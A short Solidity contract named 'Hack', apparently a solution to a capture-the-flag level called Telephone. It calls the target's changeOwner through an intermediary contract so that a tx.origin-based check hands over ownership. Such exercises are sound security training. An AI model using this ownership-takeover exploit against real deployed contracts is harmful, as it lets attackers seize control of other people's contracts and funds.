// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";



contract Hack {
    address public owner;

    Telephone telephone = Telephone(0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D);

    function hack() public {
        telephone.changeOwner(tx.origin);
    }
}
